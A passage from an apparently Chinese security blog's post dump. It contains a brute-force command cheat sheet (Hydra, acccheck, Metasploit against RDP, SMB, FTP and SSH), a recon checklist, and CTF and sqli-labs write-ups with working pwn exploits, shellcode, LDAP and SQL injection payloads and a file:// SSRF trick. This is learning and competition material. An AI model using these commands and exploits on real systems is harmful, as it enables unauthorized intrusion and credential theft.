connec错误解决方案：&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;进入Mysql数据库查看max_connect_errors：&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;show variables like ‘max_connect_errors’;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;修改max_connect_errors的数量为1000：&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set global max_connect_errors = 1000;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;查看是否修改成功：&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;show variables like ‘max_connect_errors’; 2.3 3389远程连接爆破&emsp;&emsp;&emsp;&emsp;2.3.1 DuBrute&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;这个只能爆rdp的，smb的用下面（比如win server）&emsp;&emsp;&emsp;&emsp;2.3.2 Hydra&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l administrator -P /top1500.txt rdp -V (rdp可以换smb)&emsp;&emsp;&emsp;&emsp;2.3.3 acccheck（smb）&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;acccheck -t 192.168.0.106 -U user.txt -P password.txt&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;acccheck -t 192.168.0.106 -u tian -P dic.txt&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;结果保存在cracked文件中 2.4 Web-Tomcat中间件&emsp;&emsp;&emsp;&emsp;2.4.1 Metasploit&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/http/tomcat_mgr_login&emsp;&emsp;&emsp;&emsp;2.4.3 对外访问&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;Server.xml&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&lt;Engine name=”Catalina” defaultHost=”IP地址”>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&lt;Host name=”IP地址” appBase=”webapps” npackWARs=”true” autoDeploy=”true”> 2.5 ftp爆破&emsp;&emsp;&emsp;&emsp;2.5.1 Metasploit&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/ftp/ftp_login&emsp;&emsp;&emsp;&emsp;2.5.2 Hydra&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l admin -P /top1500.txt ftp -V 2.6 ssh爆破&emsp;&emsp;&emsp;&emsp;2.6.1 Metasploit&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/ssh/ssh_login&emsp;&emsp;&emsp;&emsp;2.6.2 Hydra&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#hydra 192.168.146.141 -l root -P /top1500.txt ssh -V 2.7 Webshell爆破&emsp;&emsp;&emsp;&emsp;2.7.1 BurpSuite","categories":[],"tags":[{"name":"暴力破解","slug":"暴力破解","permalink":"http://yoursite.com/tags/暴力破解/"}]},{"title":"Web渗透测试中一些信息收集的方法和思路","slug":"information-collection","date":"2019-01-17T12:02:20.000Z","updated":"2020-09-18T03:38:45.378Z","comments":true,"path":"2019/01/17/information-collection/","link":"","permalink":"http://yoursite.com/2019/01/17/information-collection/","excerpt":"对敌人不了解，怎么打败敌人","text":"对敌人不了解，怎么打败敌人 一、 信息收集：1.1 真实IP地址&emsp;&emsp;如果IP地址不是真实的，测试会出现偏差(如：测试的端口服务全部都是假的)&emsp;&emsp;1.1.1 ping命令&emsp;&emsp;1.1.2 IP138在线查询&emsp;&emsp;1.1.3 CDN地址探测（隐藏真实IP地址）&emsp;&emsp;&emsp;&emsp;如：xxx.cdn.XXX….IP地址（这个是CDN地址不是真实IP）&emsp;&emsp;&emsp;&emsp;绕过CDN小窍门：XSS漏洞、DDOS、邮件订阅…等 1.2 端口服务探测&emsp;&emsp;用于暴力破解、系统架构判断&emsp;&emsp;1个域名可以解析多个IP地址的端口&emsp;&emsp;1.2.1 Nmap探测&emsp;&emsp;1.2.2 Zenmap探测 1.3 HTML前端敏感注释信息&emsp;&emsp;1.3.1 &lt;!–看注释信息,因为有的管理员会把测试账户密码写进去–&gt;&emsp;&emsp;1.3.2 前端框架信息，如：Jquery框架&emsp;&emsp;1.3.3 框架查看攻略&emsp;&emsp;&emsp;&emsp;1.3.3.1 路径地址（扔百度里）&emsp;&emsp;&emsp;&emsp;1.3.3.2 JS里面版权信息&emsp;&emsp;1.3.4 框架信息扔百度里搜索公开漏洞&emsp;&emsp;&emsp;&emsp;1.3.4.1 DOM XSS跨站脚本攻击漏洞&emsp;&emsp;&emsp;&emsp;1.3.4.2 ….（其他未知漏洞） 1.4 whois信息收集&emsp;&emsp;1.4.1 在线收集，如：DNS地址/注册邮箱/时间…等&emsp;&emsp;&emsp;&emsp;1.4.1.1 拿到邮箱地址可以百度查询公开的密码等信息&emsp;&emsp;1.4.2 Kali-whois查询 1.5 中间件版本信息&emsp;&emsp;1.5.1 系统报错的方式&emsp;&emsp;1.5.2 抓包的方式（如：请求：OPTIONS）&emsp;&emsp;&emsp;&emsp;1.5.2.1 如果OPTIONS以后开启了PUT方法，可以尝试上传漏洞GETSHELL&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;IIS6.0、Apache存在这个漏洞可能性较大&emsp;&emsp;1.5.3 漏洞扫描器自带判断功能&emsp;&emsp;1.5.4 端口服务探测方式自动探测 1.6 系统功能信息&emsp;&emsp;只要能交互的，全部都收集（包括功能地址）&emsp;&emsp;1.6.1 增删改查功能&emsp;&emsp;1.6.2 文件上传功能&emsp;&emsp;1.6.3 功能请求方式和参数 1.7 系统服务端编程语言&emsp;&emsp;1.7.1 编程语言（JavaWeb、PHP…等）&emsp;&emsp;&emsp;&emsp; JSP（特征：HTML前端开头以及部分代码模块后面大量的换行）&emsp;&emsp;1.7.2 编程框架（如：S2、THinkPHP…等以及相关目录和URL后缀）&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;如：.action、.do 1.8 域名/子域名&emsp;&emsp;二级、三级、四级、五级…,通过域名来判断该系统的数量规模&emsp;&emsp;1.8.1 子域名挖掘机&emsp;&emsp;1.8.2 其他工具（….） 1.9 目录/子目录&emsp;&emsp;二级、三级、四级、五级…&emsp;&emsp;1.9.1 御剑目录扫描器&emsp;&emsp;1.9.2 Kali-Dirb目录探测&emsp;&emsp;1.9.3 Kali-Dirbuster（/usr/share/dirbuster下）&emsp;&emsp;1.9.4 BurpSuite爬虫 1.10 C段/旁注&emsp;&emsp;1.10.1 旁站在线查询&emsp;&emsp;1.10.2 C段在线查询 1.11 DNS地址信息收集&emsp;&emsp;SOA 权威记录&emsp;&emsp;NS 服务器记录&emsp;&emsp;A IPv4地址记录&emsp;&emsp;MX 邮件交换记录&emsp;&emsp;PTR IP地址反解析&emsp;&emsp;AAAA IPv6地址记录&emsp;&emsp;CNAME 别名记录&emsp;&emsp;1.11.1 Kali-Dig&emsp;&emsp;1.11.2 Kali-dnsenum 1.12 综合信息收集&emsp;&emsp;1.12.1 Kali-theharvester(比如：-d baidu.com -l 100 -b bing) 1.13 资产信息收集&emsp;&emsp;1.13.1 钟馗之眼（在线）&emsp;&emsp;1.13.2 佛法查询（在线） 1.14 搜索引擎黑客&emsp;&emsp;1.14.1 百度黑客搜索语法&emsp;&emsp;1.14.2 谷歌黑客搜索语法 1.15 邮箱信息&emsp;&emsp;1.15.1 公开的邮箱地址&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;如：@XX.com&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;你可以看到命名规则，还能收集更多的信息&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;留着邮箱地址后期可以暴力破解&emsp;&emsp;1.15.2 邮箱地址泄露的密码&emsp;&emsp;1.15.3 邮箱地址泄露的其他信息 1.16 系统公开漏洞&emsp;&emsp;1.16.1 乌云镜像&emsp;&emsp;1.16.2 老漏洞复现&emsp;&emsp;1.16.3 老漏洞暴露的其他信息 1.17 WAF防火墙探测&emsp;&emsp;1.17.1 报错方式&emsp;&emsp;1.17.2 漏洞探测（如：敏感字符：% – “ ‘ @ //等）&emsp;&emsp;1.17.3 公开漏洞&emsp;&emsp;1.17.4 扫描探测（如：Nmap） 1.18 其他信息收集&emsp;&emsp;1.18.1 火狐插件-Wappalyzer&emsp;&emsp;1.18.2 其他插件….&emsp;&emsp;1.18.3 APP手机软件破解或抓包&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;破解以后里面有注释信息和其他信息&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;抓包可以看到通讯IP地址，进行二次，三次信息收集和渗透","categories":[],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://yoursite.com/tags/信息收集/"},{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://yoursite.com/tags/渗透测试/"}]},{"title":"PCB鹏城杯CTFwriteup&复现","slug":"PCBCTFwp","date":"2018-12-03T04:33:23.000Z","updated":"2020-09-18T03:35:06.940Z","comments":true,"path":"2018/12/03/PCBCTFwp/","link":"","permalink":"http://yoursite.com/2018/12/03/PCBCTFwp/","excerpt":"大大大佬的博客-&gt;传送门","text":"大大大佬的博客-&gt;传送门 PWN0x00 overInt思路：有两个key的检测，过了之后有一个循环以下内容*(&amp;v8 + v6) = v5; v3 = (int *)(unsigned int)v5; printf(\"str_pos is %c\\n\", v3); 这里直接将输入的值写到一个地址的偏移，就有一个任意地址写的洞，然后通过这个进行常规的ropexp如下from pwn import * from struct import pack context(os='linux',arch='amd64',aslr = 'False') local = 0 log_level='debug' if local: p = process(\"./overInt\")#,env=&#123;'LD_PRELOAD':'./libc_x64.so.6'&#125;) elf = ELF(\"./overInt\") #libc = ELF('./libc_x64.so.6') else: p = remote('58.20.46.148',35272) elf = ELF(\"./overInt\") #libc = ELF('./libc_x64.so.6') def change_addr(num,string): j = 0 for i in range(8): p.recvuntil(\"Which position you want to modify?\\n\") payload = p32(num) p.send(payload) p.recvuntil(\"What content you want to write in?\\n\") payload = string[j] p.send(payload) num += 1 j += 1 pop_rdi = 0x0000000000400b13 read_got = elf.got[\"read\"] # 0x602038 alarm_got = elf.got[\"alarm\"] # 0x602030 start = 0x4005D0 puts_plt = elf.plt[\"puts\"] # 0x40054c #gdb.attach(p,\"b *0x400AAC\") p.recvuntil(\"Please set arrary number:\") p.send(\"over\") p.recvuntil(\"How many numbers do you have?\\n\") p.send(p32(10)) for i in range(9): data = p.recv() p.send(p32(0)) p.recv() p.send(p32(0x20633372)) p.recvuntil(\"How many positions you want to modify?\\n\") p.send(p32(32)) string = \"\\x13\\x0b\\x40\\x00\\x00\\x00\\x00\\x00\" #pop_rdi change_addr(0x38,string) string = \"\\x38\\x20\\x60\\x00\\x00\\x00\\x00\\x00\" #read_got change_addr(0x40,string) string = \"\\x4c\\x05\\x40\\x00\\x00\\x00\\x00\\x00\" #puts_plt change_addr(0x48,string) string = \"\\xd0\\x05\\x40\\x00\\x00\\x00\\x00\\x00\" #start change_addr(0x50,string) p.recvuntil(\"!\") data = p.recvuntil(\"\\n\",drop=True) data = data.ljust(8,\"\\x00\") data = u64(data) libc_base = data - 0x0f7250 print \"base : \"+hex(libc_base) binsh_addr = libc_base + 0x18cd57 system_addr = libc_base + 0x045390 print \"system_addr :\" +hex(system_addr) print \"binsh_addr :\" +hex(binsh_addr) #gdb.attach(p,\"b *0x400AAC\") p.recvuntil(\"Please set arrary number:\") p.send(\"over\") p.recvuntil(\"How many numbers do you have?\\n\") p.send(p32(10)) for i in range(9): data = p.recv() p.send(p32(0)) p.recv() p.send(p32(0x20633372)) p.recvuntil(\"How many positions you want to modify?\\n\") p.send(p32(24)) string = \"\\x13\\x0b\\x40\\x00\\x00\\x00\\x00\\x00\" #pop_rdi change_addr(0x38,string) string = pack('L',binsh_addr) change_addr(0x40,string) string = pack('L',system_addr) change_addr(0x48,string) p.interactive() 0x01 treasure这个题目是赛后队友才做出来的，有点可惜。思路是劫持程序流。提前布局，R15和R14寄存器是没有用到的，每次输入只能输入9个字符长度，所以不能直接写shellcode，第一次写入控制那个9个长度的变量，使程序不跳到9，长度就可变。exp如下：from pwn import * from struct import pack context(os='linux',arch='amd64',aslr = 'False') local = 1 log_level='debug' if local: p = process(\"./treasure\")#,env=&#123;'LD_PRELOAD':'./libc_x64.so.6'&#125;) elf = ELF(\"./treasure\") #libc = ELF('./libc_x64.so.6') else: p = remote('58.20.46.148',35272) elf = ELF(\"./overInt\") #libc = ELF('./libc_x64.so.6') def mycode(shellcode): p.recvuntil(\"(enter 'n' to quit) :\") p.sendline(\"\\x90\") p.recvuntil(\"start!!!!\") p.send(shellcode) test = \"abcdefghi\" #gdb.attach(p,\"b *0x4009BA\" ) #b *0x400AAE\") trea_addr = 0x4009BA shellcode = asm(\"mov r15,rdx;\"+\"nop;\"*6) mycode(shellcode) shellcode = asm(\"mov ebx,0x400A6c;mov r14,rbx;\"+\"nop;\"*1) mycode(shellcode) shellcode = asm(\"mov ebx,30;\"+\"nop;\"*4) mycode(shellcode) shellcode = asm(\"mov rax,r15;mov rsi,rbx;jmp r14;\") mycode(shellcode) shellcode = \"\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05\" p.sendline(shellcode) \"\"\" p.recvuntil(\"(enter 'n' to quit) :\") p.sendline(\"\\x90\") p.recvuntil(\"start!!!!\") p.send(test) \"\"\" p.interactive() MISC0x02 traffic light题目给的GIF图片有1168帧，把每一帧都提取出来，红绿灯表示01，黄灯表示间隔，得到二进制再转城可见字符就可以得到flag 0x03 GreatWalllsb隐写提出一张jpg，+是分隔符，长短杠分别是二进制的1和0，然后转成字符#encoding:utf-8 list1 = [1010011,1110100,110011,1100111,110100,1101110,110000,1100111,1110010,110100,1110000,1101000,1111001,1011111,110001,1110011,1011111,110001,1101110,1110100,110011,1110010,110011,1110011,1110100,110001,1101110,1100111] j = '' result ='' for i in range(len(list1)): tmp = int(str(list1[i]),2) result += chr(tmp) print result 0x04 hack1t这道题的思路类似于进pe系统读windows的文件，通过加载另外一个系统读取文件。首先这个虚拟机有密码，题目已经给出了，但是没有给出修改配置的密码，也就是说我们只能打开，不能修改任何东西，配置文件xxx.vmx也是被加了密的，百度到一个github项目可以破解vmx配置文件的破解GitHub项目但是这个项目的代码有一点瑕疵，直接解密会触发一个错误root@Ubuntu:~/Desktop/VMwareVMX-master# python3 main.py \"Ubuntu 64-bit.vmx\" Password: Error: File Ubuntu 64-bit.vmx is not a valid VMX file 原因是代码中给的displayname是小写，但是判断却是大写displayName,修改成小写即可然后就可以得到解密后的vmx配置信息root@Ubuntu:~/Desktop/VMwareVMX-master# python3 main.py \"Ubuntu 64-bit.vmx\" Password: guestos = \"ubuntu-64\" virtualhw.version = \"13\" config.version = \"8\" numvcpus = \"2\" cpuid.coresPerSocket = \"1\" memsize = \"2048\" pciBridge0.present = \"TRUE\" pciBridge4.present = \"TRUE\" pciBridge4.virtualDev = \"pcieRootPort\" pciBridge4.functions = \"8\" pciBridge5.present = \"TRUE\" pciBridge5.virtualDev = \"pcieRootPort\" pciBridge5.functions = \"8\" pciBridge6.present = \"TRUE\" pciBridge6.virtualDev = \"pcieRootPort\" pciBridge6.functions = \"8\" pciBridge7.present = \"TRUE\" pciBridge7.virtualDev = \"pcieRootPort\" pciBridge7.functions = \"8\" vmci0.present = \"TRUE\" mks.enable3d = \"true\" scsi0:0.present = \"TRUE\" scsi0:0.deviceType = \"disk\" scsi0:0.fileName = \"Ubuntu 64-bit-disk1.vmdk\" scsi0:0.mode = \"persistent\" scsi0.virtualDev = \"lsilogic\" scsi0.present = \"TRUE\" sata0.present = \"TRUE\" vmci0.unrestricted = \"false\" vcpu.hotadd = \"true\" mem.hotadd = \"true\" powerType.powerOff = \"soft\" powerType.reset = \"soft\" powerType.suspend = \"soft\" toolscripts.afterpoweron = \"true\" toolscripts.afterresume = \"true\" toolscripts.beforepoweroff = \"true\" toolscripts.beforesuspend = \"true\" tools.syncTime = \"false\" nvram = \"Ubuntu 64-bit-file1.nvram\" virtualHW.productCompatibility = \"hosted\" extendedConfigFile = \"Ubuntu 64-bit.vmxf\" dataFileKey = \"type=key:cipher=AES-256:key=NHhuUIeIg1lhhNi7CvHXZysR+lrMxsNhJl7DO0SIuZ4%3d\" cryptoState = \"encrypted\" isolation.tools.copy.disable = \"TRUE\" isolation.tools.dnd.disable = \"TRUE\" isolation.tools.paste.disable = \"TRUE\" policy.vm.mvmtid = \"52 b5 65 b9 89 e2 54 bf-e2 ee e6 99 1f 9d 2d 29\" rollingTier0.uid = \"1\" rollingTier0.interval = \"86400\" rollingTier0.maximum = \"1\" rollingTier0.clientFlags = \"8\" rollingTier0.displayName = \"自动保护快照\" rollingTier1.uid = \"2\" rollingTier1.interval = \"604800\" rollingTier1.baseTier = \"1\" rollingTier1.baseTierInterval = \"7\" rollingTier1.maximum = \"1\" rollingTier1.clientFlags = \"8\" rollingTier1.displayName = \"自动保护快照\" rollingTier2.uid = \"3\" rollingTier2.interval = \"2419200\" rollingTier2.baseTier = \"1\" rollingTier2.baseTierInterval = \"28\" rollingTier2.maximum = \"1\" rollingTier2.clientFlags = \"8\" rollingTier2.displayName = \"自动保护快照\" snapshot.numRollingTiers = \"3\" floppy0.present = \"FALSE\" uuid.bios = \"56 4d 06 45 68 99 38 62-e8 b8 d6 23 3b 97 07 eb\" uuid.location = \"56 4d 06 45 68 99 38 62-e8 b8 d6 23 3b 97 07 eb\" migrate.hostlog = \".\\Ubuntu 64-bit-0dae80fb.hlog\" scsi0:0.redo = \"\" pciBridge0.pciSlotNumber = \"17\" pciBridge4.pciSlotNumber = \"21\" pciBridge5.pciSlotNumber = \"22\" pciBridge6.pciSlotNumber = \"23\" pciBridge7.pciSlotNumber = \"24\" scsi0.pciSlotNumber = \"16\" vmci0.pciSlotNumber = \"32\" sata0.pciSlotNumber = \"33\" vmci0.id = \"-119750326\" monitor.phys_bits_used = \"43\" vmotion.checkpointFBSize = \"4194304\" vmotion.checkpointSVGAPrimarySize = \"134217728\" cleanShutdown = \"TRUE\" softPowerOff = \"FALSE\" svga.guestBackedPrimaryAware = \"TRUE\" rollingTier0.timeSincelast = \"203\" rollingTier1.timeSincelast = \"203\" rollingTier2.timeSincelast = \"203\" svga.vramSize = \"134217728\" 用一个正常的虚拟机添加一个CD/DVD，指向一个kali的iso，发现配置文件会多了下面三行代码sata0:0.deviceType = \"cdrom-image\" sata0:0.fileName = \"D:\\kali\\kali-linux-2018.2-amd64.iso\" sata0:0.present = \"TRUE\" 加到上面的代码上去重新加密一下root@Ubuntu:~/Desktop/VMwareVMX-master# python3 main.py -e -D \"Ubuntu 64-bit\" -p bibinb ubuntu.vmx result.vmx -D指定虚拟机的名字，ubuntu.vmx待加密的文件，result.vmx加密后的结果，再用result.vmx替换掉原来的配置，打开虚拟机就可以看到多了CD/DVD开机按esc进BIOS选CD/DVD启动选第一个进到kali里打开文件系统find一下把4个部分凑一起打开就getflag 0x05 What’s_this文件删了复现不了了，只能看大佬的博客了 CRYPTO0x04 easy crypto本质就是异或，逆操作一遍就可以了payloa如下：#!usr/bin/python #_*_ coding=UTF-8 _*_ from Crypto.Cipher import AES from binascii import b2a_hex, a2b_hex from Crypto import Random import sys #from FLAG import flag class aesdemo: #aes = AES.new(key,mode) def __init__(self,key): self.key = key #self.BS=BS def pad(self,msg): #BS = AES.block_size # aes数据分组长度为128 bit byte = 16 - len(msg) % 16 return msg + chr(byte) * byte def unpad(msg): if not msg: return '' return msg[:-ord(msg[-1])] def xor(self,a, b): #assert len(a) == len(b) return ''.join([chr(ord(ai)^ord(bi)) for ai, bi in zip(a,b)]) def split_by(self,data,step): return [data[i : i+step] for i in xrange(0, len(data), step)] def encrypt(self, plaintext): # 生成随机初始向量IV iv = Random.new().read(16) print \"iv is\",iv.encode('hex') aes = AES.new(self.key,AES.MODE_CBC,iv) prev_pt = iv prev_ct = iv ct=\"\" msg=self.pad(plaintext) for block in self.split_by(msg, 16): ct_block = self.xor(block, prev_pt) ct_block = aes.encrypt(ct_block) ct_block = self.xor(ct_block, prev_ct) ct += ct_block return b2a_hex(iv + ct) def decrypt(self, ciphertext,iv): # 生成随机初始向量IV print \"iv is\",iv.encode('hex') aes = AES.new(self.key,AES.MODE_CBC,iv) prev_pt = iv prev_ct = iv ct=\"\" #msg=self.pad(plaintext) for block in self.split_by(ciphertext, 16): ct_block = self.xor(block, prev_pt) ct_block = aes.decrypt(ct_block) ct_block = self.xor(ct_block, prev_ct) ct += ct_block return b2a_hex(iv + ct) s = '524160f3d098ad937e252494f827f8cf26cc549e432ff4b11ccbe2d8bfa76e5c6606aad5ba17488f11189d41bca45baa' iv = s[0:32].decode('hex') sc = s[32::].decode('hex') print len(iv),len(sc) flag = 'A'*64 BS = AES.block_size # aes数据分组长度为128 bit key=\"asdfghjkl1234567890qwertyuiopzxc\" demo = aesdemo(key) e = demo.encrypt(flag) print(\"加密：\", e) aaa = demo.decrypt(sc,iv) print aaa print aaa.decode('hex')","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"},{"name":"misc","slug":"misc","permalink":"http://yoursite.com/tags/misc/"},{"name":"PCB鹏城杯","slug":"PCB鹏城杯","permalink":"http://yoursite.com/tags/PCB鹏城杯/"},{"name":"pwn","slug":"pwn","permalink":"http://yoursite.com/tags/pwn/"},{"name":"crypro","slug":"crypro","permalink":"http://yoursite.com/tags/crypro/"}]},{"title":"CSAW'18 CTF writeup","slug":"CSAW","date":"2018-09-17T05:35:41.000Z","updated":"2020-09-18T03:34:26.431Z","comments":true,"path":"2018/09/17/CSAW/","link":"","permalink":"http://yoursite.com/2018/09/17/CSAW/","excerpt":"web题目好难啊，太菜了，真的是太菜了","text":"web题目好难啊，太菜了，真的是太菜了 Ldab&emsp;&emsp;瞎测了一下发现不是sql注入，百度查了一下Ldab得到一个Ldap注入，Ldap是轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。简单来说就是类似数据库的一个东东。详细介绍点这里–&gt;传送门第一次接触找不到注入姿势，下面给出大佬的payload*)(uid=*))(|(uid=* Algebra数学计算，下面放出大佬的payload# -*- coding:utf-8 -*- import socket sc = socket.socket() # 创建 socket 对象 host = \"misc.chal.csaw.io\" # 获取本地主机名 port = 9002 # 设置端口 addr = (host, port) sc.connect(addr) # 绑定端口号 print sc.recv(1024) def solve1(eq,var='X'): eq1 = eq.replace(\"=\",\"-(\") + \")\" c = eval(eq1,&#123;var:1j&#125;) if (-c.real == 0): return 0 else: return -c.real/c.imag def find(): data = sc.recv(1024) print data equation = data.split('\\n')[0] result = str(solve1(equation)) print '正在求解：' + equation + ', result = ' + result sc.send(result + '\\n') print '===========================' find() i = 1 while True: print '============ 第 ' + str(i + 1) + ' 轮 ===============' data = sc.recv(2048) print data equation = data.split('\\n')[1] result = str(solve1(equation)) print '正在求解：' + equation + ', result = ' + result sc.send(result + '\\n') i += 1 Take an L题目意思是，给你一个64x64的棋盘，随机给一个特殊格子，像下面然后用四种L型的瓷砖覆盖然后把每个L型瓷砖的坐标发过去百度上找到的一个分治策略的做法–&gt;传送门# coding:utf-8 from pwn import * import re #context.log_level =\"debug\" nc = remote(\"misc.chal.csaw.io\",9000) nc.recvlines(4) dimension = nc.recvline() print dimension txt = nc.recvline() print txt localtion2 = re.search(':',txt).span() block = txt[localtion2[1]+1:-1] li = re.findall(r'\\d+',block) xxxx = int(li[0]) yyyy = int(li[1]) # 定义数组宽度为2的几次方 k = 6 # 棋盘宽度 size1 = pow(2, k) # L形块的初始值 mark = 0 # table初始化 table = [[-1 for x in range(size1)] for y in range(size1)] flag = \"\" def chess(tr, tc, pr, pc, size): global mark global table if size == 1: return mark += 1 count = mark half = size // 2 if pr &lt; tr + half and pc &lt; tc + half: chess(tr, tc, pr, pc, half) else: table[tr + half - 1][tc + half - 1] = count chess(tr, tc, tr + half - 1, tc + half - 1, half) if pr &lt; tr + half and pc &gt;= tc + half: chess(tr, tc + half, pr, pc, half) else: table[tr + half - 1][tc + half] = count chess(tr, tc + half, tr + half - 1, tc + half, half) if pr &gt;= tr + half and pc &lt; tc + half: chess(tr + half, tc, pr, pc, half) else: table[tr + half][tc + half - 1] = count chess(tr + half, tc, tr + half, tc + half - 1, half) if pr &gt;= tr + half and pc &gt;= tc + half: chess(tr + half, tc + half, pr, pc, half) else: table[tr + half][tc + half] = count chess(tr + half, tc + half, tr + half, tc + half, half) # 棋盘展示 def show(t): n = len(t) for i in range(n): for j in range(n): print \"%4d\" % t[i][j], print def showpoint(t): global flag n = len(t) for k in range(1366): #5个L for i in range(n): for j in range(n): if (t[i][j] == k): x = \"(%d,%d)\" % (i,j) flag += x #print \"%3s\" % x, flag = re.sub('\\\\)\\\\(','),(',flag) if (flag != ''): nc.sendline(flag) print \"%s --- ok\" % flag flag = '' chess(0, 0, xxxx, yyyy, size1) #show(table) showpoint(table) print \"-----------------------ok-------------------------\" txt = nc.recvline() print txt nc.interactive() ####战队其他大佬的writeCSAW 2018 pwn wpCSAW 2018 writeupCSAW 2018 复现writeup","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"},{"name":"misc","slug":"misc","permalink":"http://yoursite.com/tags/misc/"},{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"},{"name":"CSAW'18 CTF","slug":"CSAW-18-CTF","permalink":"http://yoursite.com/tags/CSAW-18-CTF/"}]},{"title":"网鼎杯writeup（复现）","slug":"wangdingbei","date":"2018-08-21T09:40:30.000Z","updated":"2020-09-18T03:32:01.813Z","comments":true,"path":"2018/08/21/wangdingbei/","link":"","permalink":"http://yoursite.com/2018/08/21/wangdingbei/","excerpt":"不会ps的不是好ctfer","text":"不会ps的不是好ctfer misc0x00 clip题目是一个旧文件系统里恢复来的disk文件本以为要用到专门的工具去打开找谷歌百度找了一遍啥也没发现，垃圾软件倒是装了不少，后来队友用010搜索IDAT发现一张有头的和没头的图片提取出来是这么个鬼样子的打横切开重新拼接成下图（我队友做的）感受到被ps和脑洞支配的恐惧了吗 0x01 minified题目是一张图片StegSolve打开看到red plane0是一片黑色，猜测和0通道有关，分别把red、blue、green和alpha的0通道提取出来用StegSolve的image combiner功能分别对比，在用alpha和green进行XOR对比时可以清楚的看到flag(做出来的人是怎么想到对比0通道的？。)感受到了被脑洞支配的恐惧了吗 webweb狗感受到来自世界的恶意，已哭晕在厕所 0x00 spider这道题参考官方给出的writeup–&gt;传送门 0x01 fakebook这道题是在比赛结束前1小时时候放出来的题目，一般这种题目都是送分题送命题首先拿到题目后发现只能登陆或者join，join的时候发现第四个字段blog似乎只能是网址，一般这种有约束条件又没给出则一定是被隐藏了，查看robots.txt发现果然有东西约束条件join之后发现只有username可以点，点进去后发现敏感参数测试后得到的信息：4个字段，过滤了union select，第四个参数进行了序列化在一段惊天地泣鬼神的注入下然鹅并没有在数据库里发现flag请教大佬获得hint1：构造类。这样构造出来的类可以执行，php代码如下&lt;?php class UserInfo &#123; public $name = \"\"; public $age = 0; public $blog = \"\"; &#125; $a = new UserInfo(); $a-&gt;name = '1'; $a-&gt;age = 12; $a-&gt;blog = 'baidu.com'; echo serialize($a); ?&gt; 源码可以看到读取了文件请教大佬获得hint2：curl读文件。源码提示了php调用curl来查询的，联想到curl可以执行读文件操作把baidu.com改成file:///var/www/html/user.php进行测试发现可以读取user.php的内容验证猜想读flag，file:///var/www/html/flag.php","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"},{"name":"misc","slug":"misc","permalink":"http://yoursite.com/tags/misc/"},{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"sqli-labs的学习记录三（23-30）","slug":"sqli-labs3","date":"2018-08-17T13:51:53.000Z","updated":"2020-09-18T03:23:27.228Z","comments":true,"path":"2018/08/17/sqli-labs3/","link":"","permalink":"http://yoursite.com/2018/08/17/sqli-labs3/","excerpt":"七夕什么的，tan90°","text":"七夕什么的，tan90° 第二十三关测试id=1&#39; and &#39;1&#39;=&#39;1时返回正常，测试id=-1&#39; order by 1 #就报错了，查看源代码可以看到我们递交的参数被过滤了–和#$id=$_GET['id']; $reg = \"/#/\"; $reg1 = \"/--/\"; $replace = \"\"; $id = preg_replace($reg, $replace, $id); $id = preg_replace($reg1, $replace, $id); 所以不能用注释的方法只能闭合查询语句，我们可以套用第八关的代码进行盲注查询id=1' and ascii(substr(database(),1,1)) &gt;= '97 python脚本代码import requests txt1 = \"http://localhost/sqli-labs/Less-23/?id=1' and ascii(substr(database(),\" txt2 = \",1)) &gt;= '\" txt3 = \",1)) = '\" payload1 = 1 payload2 = 97 txt4 = 'Your Login name' num11 = 97 num12 = 65 num13 = 48 code = '' num1 = 0 num2 = 0 num3 = 0 for i in range(1,9): url = txt1+str(i)+txt2+str(num11) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext == txt4): num1 = 1 url = txt1+str(i)+txt2+str(num12) req = requests.get(url = url) reqtext = req.text[554:569] if(reqtext == txt4): num2 = 